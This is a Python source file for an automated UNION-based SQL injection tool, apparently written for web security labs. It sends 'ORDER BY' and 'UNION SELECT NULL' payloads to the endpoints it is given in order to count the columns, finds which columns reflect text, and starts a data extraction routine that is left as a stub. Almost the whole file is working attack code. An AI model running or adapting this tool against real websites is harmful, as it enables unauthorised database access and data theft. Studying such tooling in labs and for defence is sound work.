import random
import requests
import string

from bs4 import BeautifulSoup

from utils.auxiliary import *
from utils.files import *

log = Auxiliary(__name__)
log.set_config()


def try_data_exfil(url, options: list):
    vuln_endpoints, db_comment, num_cols, str_index = \
        options[0], options[1], options[2], options[3]
    tables = File("tables.txt")
    columns = File("columns.txt")
    # for table_line in tables:
    print(tables.readline())


def swap_null_w_str(pld, text_str, index, options: list):
    db_comment, num_cols = options[1], options[2]
    # Stripping NULL--, adding our text string
    str_pld = f"{pld[:-6]}'{text_str}'" + \
        ", NULL" * (num_cols - index) + db_comment
    return str_pld


def find_string_to_reflect(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    text_str = soup.find(id="hint")
    if text_str:
        text_str = text_str.string.split(': ')[1]
        # Stripping character '
        text_str = text_str[1:-1]
    else:
        # Generating a custom string
        text_str = ''.join(random.choices(
            string.ascii_letters + string.digits, k=15))
    return text_str


def find_text_cols(url, options: list):
    vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
    text_str = find_string_to_reflect(url)
    for endp in vuln_endpoints:
        for index in range(1, int(num_cols) + 1):
            pld = generate_null_pld(db_comment, index)
            pld = swap_null_w_str(pld, text_str, index, options)
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying to find columns "
                            "containing the text on endpoint "
                            f"{url + endp + pld}")
            if r.status_code == 200 and text_str in r.text:
                log.logger.info(f"{GREEN}[+]{RESET} Column {index} "
                                "contains text, appending it to list")
                options[3].append(index)


def try_order_by_sqli(url, options: list):
    vuln_endpoints, db_comment = options[0], options[1]
    for endp in vuln_endpoints:
        for index in range(1, 25):
            pld = "' ORDER BY " + str(index) + db_comment
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 500:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index - 1}")
                return index - 1


def generate_null_pld(db_comment, index):
    base_pld = "' UNION SELECT NULL"
    # If we have first payload return it
    if index == 1:
        return base_pld + db_comment
    # Otherwise we add NULLs
    nulls = ", NULL" * (index - 1)
    base_pld += nulls + db_comment
    return base_pld


def try_null_sqli(url, options: list):
    vuln_endpoints, db_comment = options[0], options[1]
    for endp in vuln_endpoints:
        for index in range(0, 25):
            pld = generate_null_pld(db_comment, index)
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index}")
                return index


def try_union_sqli(url, options: list):
    # options[2] = try_null_sqli(url, options)
    # if not options[2]:
    #     options[2] = try_order_by_sqli(url, options)
    # find_text_cols(url, options)
    try_data_exfil(url, options)
